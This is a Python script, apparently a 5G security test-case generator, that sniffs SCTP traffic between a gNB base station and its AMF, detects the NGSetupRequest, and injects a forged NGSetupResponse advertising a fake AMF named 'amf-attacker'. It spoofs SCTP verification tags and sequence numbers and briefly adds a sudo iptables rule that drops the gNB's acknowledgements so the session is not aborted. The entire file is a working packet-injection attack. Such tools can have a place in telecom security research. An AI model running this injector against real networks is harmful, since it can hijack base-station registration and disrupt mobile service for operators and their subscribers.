import json
import os
import time
import struct
import subprocess
import threading

from scapy.all import rdpcap, sniff, sendp
from scapy.layers.inet import IP
from scapy.layers.l2 import Ether
from scapy.packet import bind_layers

# SCTP imports (try contrib, fallback to core)
try:
    from scapy.contrib.sctp import SCTP, SCTPChunkData, SCTPChunkInit, SCTPChunkInitAck, SCTPChunkCookieAck
    bind_layers(IP, SCTP, proto=132)
except:
    try:
        from scapy.layers.sctp import SCTP, SCTPChunkData, SCTPChunkInit, SCTPChunkInitAck, SCTPChunkCookieAck
        bind_layers(IP, SCTP, proto=132)
    except:
        SCTP = SCTPChunkData = SCTPChunkInit = SCTPChunkInitAck = SCTPChunkCookieAck = None

# NGAP imports
try:
    from pycrate_asn1dir import NGAP
    from pycrate_asn1rt.err import ASN1ObjErr
    NGAP_AVAILABLE = True
except ImportError:
    NGAP_AVAILABLE = False


def decode_plmn(plmn_bytes):
    """Decode PLMN bytes to MCC/MNC strings (3GPP TS 24.301)."""
    if len(plmn_bytes) < 3:
        return None, None
    
    b1, b2, b3 = plmn_bytes[0], plmn_bytes[1], plmn_bytes[2]
    mcc = f"{b1&0x0F}{(b1&0xF0)>>4}{b2&0x0F}"
    
    if (b2 & 0xF0) >> 4 == 0xF:
        mnc = f"{b3&0x0F}{(b3&0xF0)>>4}"
    else:
        mnc = f"{(b2&0xF0)>>4}{(b1&0xF0)>>4}{(b3&0xF0)>>4}"
    
    return mcc, mnc


def encode_plmn_identity(mcc, mnc):
    """Encode MCC/MNC into 3-byte PLMNIdentity."""
    mcc = str(mcc).zfill(3)
    mnc = str(mnc)
    if len(mnc) == 2:
        mnc = mnc + "f"
    elif len(mnc) == 1:
        mnc = mnc + "ff"
    b1 = int(mcc[1] + mcc[0], 16)
    b2 = int(mnc[2] + mcc[2], 16)
    b3 = int(mnc[1] + mnc[0], 16)
    return bytes([b1, b2, b3])


def extract_ngsetup_request(ngsetup_request):
    """Extract MCC/MNC/SST from NGSetupRequest."""
    extracted = {}
    try:
        for ie in ngsetup_request.get("protocolIEs", []):
            ie_id = ie.get("id", 0)
            ie_value = ie.get("value", {})
            
            # GlobalRANNodeID (id 27)
            if ie_id == 27 and isinstance(ie_value, tuple) and len(ie_value) >= 2:
                node_id = ie_value[1]
                if isinstance(node_id, tuple) and node_id[0] == "globalGNB-ID":
                    gnb_id = node_id[1]
                    if isinstance(gnb_id, dict):
                        plmn = gnb_id.get("pLMNIdentity", b"")
                        if plmn:
                            mcc, mnc = decode_plmn(plmn)
                            if mcc and mnc:
                                extracted["mcc"], extracted["mnc"] = mcc, mnc
            
            # SupportedTAList (id 102)
            if ie_id == 102:
                ta_list = ie_value if isinstance(ie_value, list) else [ie_value]
                for ta_item in ta_list:
                    if isinstance(ta_item, dict):
                        for plmn_item in ta_item.get("broadcastPLMNList", []):
                            if isinstance(plmn_item, dict):
                                for slice_item in plmn_item.get("tAISliceSupportList", []):
                                    if isinstance(slice_item, dict):
                                        nssai = slice_item.get("s-NSSAI", {})
                                        sst = nssai.get("sST", b"")
                                        if sst:
                                            extracted["sst"] = f"{sst[0]:02X}" if isinstance(sst, bytes) else f"{sst:02X}"
                                            return extracted
    except:
        pass
    return extracted if extracted else None


def decode_ngap_message(ngap_bytes):
    """Decode NGAP message from bytes."""
    if not NGAP_AVAILABLE:
        return None
    try:
        PDU = NGAP.NGAP_PDU_Descriptions.NGAP_PDU
        PDU.from_aper(ngap_bytes)
        pdu_val = PDU.get_val()
        
        if isinstance(pdu_val, tuple) and len(pdu_val) >= 2:
            if pdu_val[0] == "initiatingMessage":
                proc_code = pdu_val[1].get("procedureCode", 0)
                if proc_code == 21:
                    value = pdu_val[1].get("value", {})
                    if isinstance(value, tuple) and value[0] == "NGSetupRequest":
                        return extract_ngsetup_request(value[1])
        return None
    except:
        return None


def build_ngap_ngsetup_response(amf_name, served_guami, amf_capacity, plmn_list):
    """Build NGSetupResponse APER using pycrate."""
    if not NGAP_AVAILABLE:
        raise RuntimeError("pycrate_asn1dir not available")
    
    PDU = NGAP.NGAP_PDU_Descriptions.NGAP_PDU
    
    mcc = served_guami.get("mcc", "001")
    mnc = served_guami.get("mnc", "01")
    plmn_bytes = encode_plmn_identity(mcc, mnc)
    region = int(served_guami.get("amf_region_id", "01"), 16)
    setid = int(served_guami.get("amf_set_id", "0001"), 16)
    pointer = int(served_guami.get("amf_pointer", "00"), 16)
    
    guami_val = {
        "pLMNIdentity": plmn_bytes,
        "aMFRegionID": (region, 8),
        "aMFSetID": (setid, 10),
        "aMFPointer": (pointer, 6),
    }
    
    plmn_items = []
    for item in plmn_list:
        plmn_bytes_item = encode_plmn_identity(item.get("mcc", mcc), item.get("mnc", mnc))
        entry = {"pLMNIdentity": plmn_bytes_item}
        if "sst" in item:
            entry["sliceSupportList"] = [{"s-NSSAI": {"sST": bytes([int(item["sst"], 16)])}}]
        plmn_items.append(entry)
    
    ies = [
        {"id": 1, "criticality": "reject", "value": ("AMFName", str(amf_name))},
        {"id": 96, "criticality": "reject", "value": ("ServedGUAMIList", [{"gUAMI": guami_val}])},
        {"id": 86, "criticality": "reject", "value": ("RelativeAMFCapacity", int(amf_capacity))},
        {"id": 80, "criticality": "reject", "value": ("PLMNSupportList", plmn_items)},
    ]
    
    pdu_val = ("successfulOutcome", {
        "procedureCode": 21,
        "criticality": "reject",
        "value": ("NGSetupResponse", {"protocolIEs": ies}),
    })
    
    PDU.set_val(pdu_val)
    return PDU.to_aper()


class AssocState:
    """Tracks SCTP association state during live sniffing."""
    def __init__(self):
        self.gnb_ip = self.amf_ip = None
        self.gnb_mac = self.amf_mac = None
        self.src_port = self.dst_port = None
        self.gnb_init_tag = self.downlink_verif_tag = None
        self.amf_initial_tsn = None
        self.ngsetup_seen = False
        self.ngsetup_sid = None
        self.ngsetup_req_pkt = None
        self.mcc = self.mnc = self.sst = None

    def has_minimum(self):
        return all([
            self.src_port is not None,
            self.dst_port is not None,
            (self.downlink_verif_tag or self.gnb_init_tag),
            self.ngsetup_seen,
        ])


class Scenario2LiveSniffer:
    """Live SCTP/NGAP sniffer and fake NGSetupResponse injector."""
    
    def __init__(self, iface, amf_name, region, setid, pointer, mcc=None, mnc=None, sst=None, 
                 debug=False, block_sack_ms=0):
        self.iface = iface
        self.amf_name = amf_name
        self.region = region
        self.setid = setid
        self.pointer = pointer
        self.cli_mcc = mcc
        self.cli_mnc = mnc
        self.cli_sst = sst
        self.debug = debug
        self.block_sack_ms = int(block_sack_ms) if block_sack_ms else 0
        self.state = AssocState()
        self.sent = False

    def _process_chunk(self, pkt, sctp_root, ch):
        """Process individual SCTP chunks."""
        ip = pkt[IP]
        chn = ch.__class__.__name__.lower()
        ctype = getattr(ch, "type", None)
        
        # Identify chunk types
        is_init_ack = (ctype == 2) or hasattr(ch, "state_cookie") or "initack" in chn
        is_init = ((ctype == 1) or chn.endswith("init")) and not is_init_ack
        is_cookie_ack = (ctype == 11) or "cookieack" in chn
        is_data = hasattr(ch, "tsn") or "data" in chn
        
        if is_init_ack:
            self.state.downlink_verif_tag = getattr(sctp_root, "tag", self.state.downlink_verif_tag)
            self.state.amf_initial_tsn = getattr(ch, "init_tsn", getattr(ch, "initial_tsn", None))
            
            # Fallback: parse from raw bytes if Scapy fields missing
            if self.state.amf_initial_tsn is None:
                try:
                    raw = bytes(ch)
                    if len(raw) >= 20 and (raw[0] == 2 or ctype == 2):
                        self.state.amf_initial_tsn = struct.unpack("!I", raw[16:20])[0]
                except:
                    pass
            
            print(f"[+] INIT-ACK: AMF initial_tsn={self.state.amf_initial_tsn}")
            return
        
        if is_init:
            if self.state.gnb_ip is None:
                self.state.gnb_ip = ip.src
                self.state.amf_ip = ip.dst
                self.state.gnb_mac = pkt[Ether].src if pkt.haslayer(Ether) else None
                self.state.amf_mac = pkt[Ether].dst if pkt.haslayer(Ether) else None
                self.state.src_port = getattr(sctp_root, "sport", None)
                self.state.dst_port = getattr(sctp_root, "dport", None)
            self.state.gnb_init_tag = getattr(ch, "initiate_tag", getattr(ch, "init_tag", None))
            print(f"[+] INIT: gNB {self.state.gnb_ip}:{self.state.src_port} -> AMF {self.state.amf_ip}:{self.state.dst_port}")
            return
        
        if is_cookie_ack:
            self.state.downlink_verif_tag = getattr(sctp_root, "tag", self.state.downlink_verif_tag)
            print(f"[+] COOKIE-ACK")
            return
        
        if is_data:
            ppid = getattr(ch, "ppid", getattr(ch, "proto_id", None))
            
            # Detect NGSetupRequest
            if ppid == 60 and self.state.gnb_ip and ip.src == self.state.gnb_ip and not self.state.ngsetup_seen:
                ngap_payload = None
                try:
                    if hasattr(ch, "data") and ch.data:
                        ngap_payload = bytes(ch.data)
                    elif hasattr(ch, "load"):
                        ngap_payload = bytes(ch.load)
                except:
                    pass
                
                if NGAP_AVAILABLE and ngap_payload:
                    decoded = decode_ngap_message(ngap_payload)
                    if decoded and "mcc" in decoded:
                        self.state.mcc = decoded.get("mcc")
                        self.state.mnc = decoded.get("mnc")
                        self.state.sst = decoded.get("sst")
                        print(f"[+] NGSetupRequest: MCC={self.state.mcc} MNC={self.state.mnc} SST={self.state.sst}")
                
                self.state.ngsetup_seen = True
                self.state.ngsetup_sid = getattr(ch, "stream_id", getattr(ch, "sid", 0)) or 0
                self.state.ngsetup_req_pkt = pkt
                print(f"[+] NGSetupRequest detected")
                
                # Fire immediately if we have INIT-ACK
                if self.state.amf_initial_tsn and (self.state.downlink_verif_tag or self.state.gnb_init_tag):
                    try:
                        self._send_response()
                    except Exception as e:
                        print(f"[!] Send error: {e}")
            return

    def _build_data_chunk(self, tsn, sid, ssn, ppid, data_bytes):
        """Build SCTP DATA chunk compatible with either core or contrib SCTP."""
        fields = [getattr(f, "name", "") for f in getattr(SCTPChunkData, "fields_desc", [])] if hasattr(SCTPChunkData, "fields_desc") else []
        kwargs = {"tsn": tsn, "data": data_bytes}
        
        # SID / SSN
        kwargs["stream_id" if "stream_id" in fields else "sid"] = sid
        kwargs["stream_seq" if "stream_seq" in fields else "ssn"] = ssn
        
        # PPID
        kwargs["proto_id" if "proto_id" in fields else "ppid"] = ppid
        
        # Flags
        if "beginning" in fields:
            kwargs.update({"beginning": 1, "ending": 1, "unordered": 0, "delay_sack": 0})
        else:
            kwargs.update({"B": 1, "E": 1, "U": 0, "I": 0})
        
        return SCTPChunkData(**kwargs)

    def _send_response(self):
        """Craft and send fake NGSetupResponse."""
        if self.sent or not self.state.has_minimum() or not self.state.ngsetup_req_pkt:
            return
        
        verif = self.state.downlink_verif_tag or self.state.gnb_init_tag or 0
        tsn = self.state.amf_initial_tsn or 0
        sid = self.state.ngsetup_sid or 0
        ssn = 0
        
        if not tsn:
            print("[!] TSN unavailable, cannot send")
            return
        
        # Get PLMN values
        mcc = self.state.mcc or self.cli_mcc or "001"
        mnc = self.state.mnc or self.cli_mnc or "01"
        sst = (self.state.sst or self.cli_sst or "01").upper()
        
        # Build NGAP payload
        served_guami = {
            "mcc": mcc, "mnc": mnc,
            "amf_region_id": self.region,
            "amf_set_id": self.setid,
            "amf_pointer": self.pointer,
        }
        plmn_list = [{"mcc": mcc, "mnc": mnc, "sst": sst}]
        ngap_bytes = build_ngap_ngsetup_response(self.amf_name, served_guami, 255, plmn_list)
        
        # Build packet layers
        req_eth = self.state.ngsetup_req_pkt[Ether] if self.state.ngsetup_req_pkt.haslayer(Ether) else None
        req_ip = self.state.ngsetup_req_pkt[IP]
        
        eth = Ether(dst=req_eth.src, src=req_eth.dst, type=0x0800) if req_eth else Ether(type=0x0800)
        ip = IP(src=req_ip.dst, dst=req_ip.src, ttl=64)
        sctp = SCTP(sport=self.state.dst_port, dport=self.state.src_port, tag=verif)
        data_chunk = self._build_data_chunk(tsn=tsn, sid=sid, ssn=ssn, ppid=60, data_bytes=ngap_bytes)
        
        pkt = eth / ip / sctp / data_chunk
        print(f"[+] Sending NGSetupResponse (tag={verif:#x} tsn={tsn} sid={sid} ssn={ssn})")
        
        # Block SACK before sending
        self._block_one_sack()
        
        sendp(pkt, iface=self.iface, verbose=0)
        self.sent = True

    def _block_one_sack(self):
        """Temporarily block gNB→AMF SACK to prevent protocol violation ABORT."""
        if self.block_sack_ms <= 0:
            return
        
        rule_args = [
            "iptables", "-I", "INPUT", "-p", "sctp",
            "-s", str(self.state.gnb_ip), "--sport", str(self.state.src_port),
            "--dport", str(self.state.dst_port),
            "-m", "sctp", "--chunk-types", "any", "sack", "-j", "DROP"
        ]
        
        try:
            subprocess.run(["sudo"] + rule_args, check=True, capture_output=True, timeout=2)
            print(f"[+] Blocking SACK for {self.block_sack_ms}ms")
            
            def remove_rule():
                time.sleep(self.block_sack_ms / 1000.0)
                rule_args_del = rule_args.copy()
                rule_args_del[1] = "-D"
                try:
                    subprocess.run(["sudo"] + rule_args_del, check=False, capture_output=True, timeout=2)
                    print(f"[+] SACK block removed")
                except:
                    pass
            
            threading.Thread(target=remove_rule, daemon=True).start()
        except Exception as e:
            print(f"[!] Failed to block SACK: {e}")

    def _handle(self, pkt):
        """Main packet handler."""
        try:
            sctp_root = pkt["SCTP"]
        except:
            return
        
        if not pkt.haslayer(IP):
            return
        
        # Track verification tag from AMF
        ip = pkt[IP]
        if self.state.amf_ip and ip.src == self.state.amf_ip:
            try:
                self.state.downlink_verif_tag = getattr(sctp_root, "tag", self.state.downlink_verif_tag)
            except:
                pass
        
        # Extract chunks
        chunks = list(getattr(sctp_root, "chunks", []) or [])
        if not chunks:
            ch_iter = getattr(sctp_root, "payload", None)
            while ch_iter and hasattr(ch_iter, "name") and "SCTPChunk" in str(ch_iter.name):
                chunks.append(ch_iter)
                ch_iter = getattr(ch_iter, "payload", None)
        if not chunks:
            chunks = [sctp_root]
        
        for ch in chunks:
            try:
                self._process_chunk(pkt, sctp_root, ch)
            except:
                pass

    def run(self):
        """Start live sniffing."""
        print(f"[+] Live attack mode on {self.iface}")
        print(f"[+] Waiting for gNB→AMF NG setup...")
        
        def tap(pkt):
            if self.debug:
                try:
                    print(f"[tap] {pkt.summary()}")
                except:
                    pass
            self._handle(pkt)
        
        sniff(iface=self.iface, prn=tap, store=0, promisc=True)


def main():
    import argparse
    p = argparse.ArgumentParser(description="Scenario2: Fake AMF NGSetupResponse injector")
    p.add_argument("--live", action="store_true", help="Live sniff→craft→send mode")
    p.add_argument("--iface", help="Network interface (e.g., eth0, ens33)")
    p.add_argument("--amf-name", default="amf-attacker", help="Fake AMF name to advertise")
    p.add_argument("--region", default="01", help="AMF Region ID (hex)")
    p.add_argument("--setid", default="0001", help="AMF Set ID (hex)")
    p.add_argument("--pointer", default="00", help="AMF Pointer (hex)")
    p.add_argument("--mcc", help="Override MCC (fallback if decode fails)")
    p.add_argument("--mnc", help="Override MNC (fallback if decode fails)")
    p.add_argument("--sst", help="Override SST hex byte (fallback if decode fails)")
    p.add_argument("--block-sack-ms", type=int, default=120, help="Block gNB SACK for N ms to prevent ABORT (default: 120)")
    p.add_argument("--debug", action="store_true", help="Print all packets")
    args = p.parse_args()
    
    if args.live:
        if not NGAP_AVAILABLE:
            print("[!] ERROR: pycrate_asn1dir not available")
            print("[!] Install: pip install pycrate")
            return
        if not args.iface:
            print("[!] ERROR: --iface required for live mode")
            return
        
        sniffer = Scenario2LiveSniffer(
            iface=args.iface,
            amf_name=args.amf_name,
            region=args.region,
            setid=args.setid,
            pointer=args.pointer,
            mcc=args.mcc,
            mnc=args.mnc,
            sst=args.sst,
            debug=args.debug,
            block_sack_ms=args.block_sack_ms,
        )
        sniffer.run()
    else:
        print("[!] Use --live mode for attack")
        print("Example: sudo python3 testcase_generation_scenario2_testing.py --live --iface eth0")


if __name__ == "__main__":
    main()
